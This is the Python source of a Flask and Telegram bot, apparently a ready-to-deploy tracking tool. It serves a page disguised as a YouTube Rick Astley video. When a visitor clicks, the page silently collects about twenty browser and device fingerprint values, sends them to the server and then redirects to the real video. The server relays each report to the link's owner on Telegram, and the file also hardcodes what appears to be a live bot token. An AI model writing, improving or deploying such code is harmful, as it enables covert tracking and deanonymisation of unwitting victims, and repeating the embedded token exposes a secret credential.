import threading
import requests
import json
import os
import base64
import time
import sqlite3
from flask import Flask, render_template_string, request

# =================================================================
# [1] CONFIGURATION
# =================================================================
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
# ВАЖНО: Замени на свой URL после деплоя на Render
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    conn.execute('CREATE TABLE IF NOT EXISTS links (sid TEXT PRIMARY KEY, owner_id INTEGER)')
    conn.commit()
    conn.close()

def save_link(sid, owner_id):
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    conn.execute('INSERT OR REPLACE INTO links (sid, owner_id) VALUES (?, ?)', (sid, owner_id))
    conn.commit()
    conn.close()

def get_owner(sid):
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    res = conn.execute('SELECT owner_id FROM links WHERE sid = ?', (sid,)).fetchone()
    conn.close()
    return res[0] if res else OVERLORD_ID

# =================================================================
# [2] ADVANCED EXPLOIT PAGE (20 DATA POINTS)
# =================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Music Video)" />
    <meta property="og:description" content="Official YouTube Video - 1.5B views" />
    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" />
    <meta property="og:site_name" content="YouTube" />
    
    <title>YouTube</title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; cursor:pointer; }
        #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; 
               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
        .play { width: 72px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 14px; position: relative; }
        .play::after { content: ""; position: absolute; left: 28px; top: 15px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
    </style>
</head>
<body onclick="ignite()">
    <div id="app"><div class="play"></div></div>
<script>
    const sid = "{{sid}}";
    let fired = false;

    function ignite() {
        if (fired) return;
        fired = true;

        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        
        const info = {
            gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
            vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A",
            cores: navigator.hardwareConcurrency || "N/A",
            mem: navigator.deviceMemory || "N/A",
            res: screen.width + "x" + screen.height,
            depth: screen.colorDepth,
            plat: navigator.platform,
            lang: navigator.language,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            touch: navigator.maxTouchPoints,
            cookies: navigator.cookieEnabled,
            dnt: navigator.doNotTrack,
            pdf: navigator.pdfViewerEnabled,
            dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
            online: navigator.onLine,
            hist: window.history.length,
            ratio: window.devicePixelRatio,
            plugins: navigator.plugins.length,
            ua: navigator.userAgent
        };

        const payload = btoa(JSON.stringify({sid: sid, data: info, ref: document.referrer || "Direct"}));
        navigator.sendBeacon('/gate/capture', payload);

        setTimeout(() => {
            window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        }, 400);
    }
</script>
</body>
</html>
"""

# =================================================================
# [3] SERVER LOGIC & DETAILED REPORTING
# =================================================================

@app.route('/v/<sid>')
def serve(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/gate/capture', methods=['POST'])
def capture():
    try:
        raw = base64.b64decode(request.get_data()).decode()
        payload = json.loads(raw)
        sid = payload.get('sid')
        d = payload.get('data', {})
        
        report = (
            f"<b>📊 ПОЛНЫЙ ОТЧЕТ (20 ПАРАМЕТРОВ)</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"1.  🆔 <b>ID:</b> <code>{sid}</code>\n"
            f"2.  🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
            f"3.  🏭 <b>Vendor:</b> <code>{d.get('vendor')}</code>\n"
            f"4.  🧠 <b>Ядра:</b> <code>{d.get('cores')}</code>\n"
            f"5.  💾 <b>RAM:</b> <code>{d.get('mem')} GB</code>\n"
            f"6.  📱 <b>Экран:</b> <code>{d.get('res')}</code>\n"
            f"7.  🔍 <b>Ratio:</b> <code>{d.get('ratio')}</code>\n"
            f"8.  🎨 <b>Цвет:</b> <code>{d.get('depth')} bit</code>\n"
            f"9.  💻 <b>ОС:</b> <code>{d.get('plat')}</code>\n"
            f"10. 📍 <b>Таймзона:</b> <code>{d.get('tz')}</code>\n"
            f"11. 🗣 <b>Язык:</b> <code>{d.get('lang')}</code>\n"
            f"12. 👆 <b>Touch:</b> <code>{d.get('touch')}</code>\n"
            f"13. 🍪 <b>Cookie:</b> <code>{d.get('cookies')}</code>\n"
            f"14. 🕵️ <b>DNT:</b> <code>{d.get('dnt')}</code>\n"
            f"15. 📄 <b>PDF:</b> <code>{d.get('pdf')}</code>\n"
            f"16. 🌙 <b>Dark:</b> <code>{d.get('dark')}</code>\n"
            f"17. 📶 <b>Online:</b> <code>{d.get('online')}</code>\n"
            f"18. 📂 <b>History:</b> <code>{d.get('hist')}</code>\n"
            f"19. 🧩 <b>Plugins:</b> <code>{d.get('plugins')}</code>\n"
            f"20. 🔗 <b>Ref:</b> <code>{payload.get('ref')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🛰 <b>UA:</b>\n<code>{d.get('ua')}</code>"
        )
        
        owner_id = get_owner(str(sid))
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": owner_id, "text": report, "parse_mode": "HTML"})
    except: pass
    return "OK"

@app.route('/ping')
@app.route('/system/heartbeat')
def health(): return "OK", 200

# =================================================================
# [4] C2 BOT ENGINE
# =================================================================

def bot_loop():
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{API_TOKEN}/getUpdates?offset={offset}&timeout=10").json()
            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message")
                if msg and "text" in msg:
                    cid = msg["chat"]["id"]
                    if msg["text"] == "/start":
                        save_link(str(cid), cid)
                        link = f"{BASE_URL}/v/{cid}"
                        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                                      json={"chat_id": cid, "text": f"🔥 <b>Система готова!</b>\n\nТвоя ссылка:\n<a href='{link}'>{link}</a>", "parse_mode": "HTML"})
        except: time.sleep(5)

if __name__ == '__main__':
    init_db()
    threading.Thread(target=bot_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT)
